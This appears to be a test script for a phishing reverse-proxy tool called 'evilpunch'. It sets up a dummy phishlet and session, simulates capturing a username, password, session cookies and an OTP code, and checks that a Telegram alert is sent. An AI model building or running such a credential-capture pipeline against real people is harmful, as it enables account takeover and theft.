#!/usr/bin/env python3
"""
Test script to verify the notification system works correctly
when credentials are captured in sessions.
"""

import os
import sys
import django
from django.conf import settings

# Add the project directory to Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Set up Django
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'evilpunch.settings')
django.setup()

from core.models import Session, Phishlet, Proxy, ProxyDomain
from core.notify import notification_manager
import uuid

def test_notification_system():
    """Test the notification system with a mock session"""
    
    print("🧪 Testing Notification System...")
    
    # Check if notification settings exist
    from core.models import NotificationSettings
    settings = NotificationSettings.objects.filter(is_active=True).first()
    
    if not settings:
        print("❌ No active notification settings found. Please configure notifications first.")
        return False
    
    print(f"✅ Found notification settings: {settings}")
    
    # Create a test phishlet if none exists
    phishlet, created = Phishlet.objects.get_or_create(
        name="test_phishlet",
        defaults={
            "data": {
                "name": "Test Phishlet",
                "auth_urls": ["/login"],
                "credentials": [
                    {"name": "username", "keyword": "username"},
                    {"name": "password", "keyword": "password"}
                ]
            }
        }
    )
    
    if created:
        print(f"✅ Created test phishlet: {phishlet.name}")
    else:
        print(f"✅ Using existing phishlet: {phishlet.name}")
    
    # Create a test proxy if none exists
    proxy, created = Proxy.objects.get_or_create(
        name="test_proxy",
        defaults={
            "proxy_type": "http",
            "host": "127.0.0.1",
            "port": 8080
        }
    )
    
    if created:
        print(f"✅ Created test proxy: {proxy.name}")
    else:
        print(f"✅ Using existing proxy: {proxy.name}")
    
    # Create a test proxy domain if none exists
    domain, created = ProxyDomain.objects.get_or_create(
        hostname="test.example.com",
        defaults={
            "is_active": True
        }
    )
    
    if created:
        print(f"✅ Created test proxy domain: {domain.hostname}")
    else:
        print(f"✅ Using existing proxy domain: {domain.hostname}")
    
    # Create a test session
    session = Session.objects.create(
        session_cookie=f"test_session_{uuid.uuid4().hex[:16]}",
        phishlet=phishlet,
        proxy_domain=domain.hostname,
        visitor_ip="127.0.0.1",
        user_agent="Test User Agent",
        is_active=True
    )
    
    print(f"✅ Created test session: {session.id}")
    
    try:
        # Test 1: Capture username (should trigger notification)
        print("\n🔍 Test 1: Capturing username...")
        session.update_captured_data(captured_username="testuser")
        print("✅ Username captured successfully")
        
        # Test 2: Capture password (should trigger notification)
        print("\n🔍 Test 2: Capturing password...")
        session.update_captured_data(captured_password="testpass123")
        print("✅ Password captured successfully")
        
        # Test 3: Capture cookies (should trigger notification)
        print("\n🔍 Test 3: Capturing cookies...")
        session.update_captured_data(captured_cookies={"session_id": "abc123"})
        print("✅ Cookies captured successfully")
        
        # Test 4: Capture custom data (should trigger notification)
        print("\n🔍 Test 4: Capturing custom data...")
        session.update_captured_data(captured_custom={"otp": "123456"})
        print("✅ Custom data captured successfully")
        
        # Test 5: Update existing data (should NOT trigger notification)
        print("\n🔍 Test 5: Updating existing data...")
        session.update_captured_data(captured_username="newuser")
        print("✅ Username updated successfully")
        
        print(f"\n🎉 All tests completed successfully!")
        print(f"📊 Final session state:")
        print(f"   - Username: {session.captured_username}")
        print(f"   - Password: {session.captured_password}")
        print(f"   - Cookies: {session.captured_cookies}")
        print(f"   - Custom: {session.captured_custom}")
        print(f"   - Is Captured: {session.is_captured}")
        print(f"   - Telegram Message ID: {session.telegram_message_id}")
        
        return True
        
    except Exception as e:
        print(f"❌ Test failed with error: {e}")
        import traceback
        traceback.print_exc()
        return False
    
    finally:
        # Clean up test data
        print(f"\n🧹 Cleaning up test data...")
        session.delete()
        if created:
            phishlet.delete()
            proxy.delete()
            domain.delete()
        print("✅ Cleanup completed")

if __name__ == "__main__":
    success = test_notification_system()
    sys.exit(0 if success else 1)
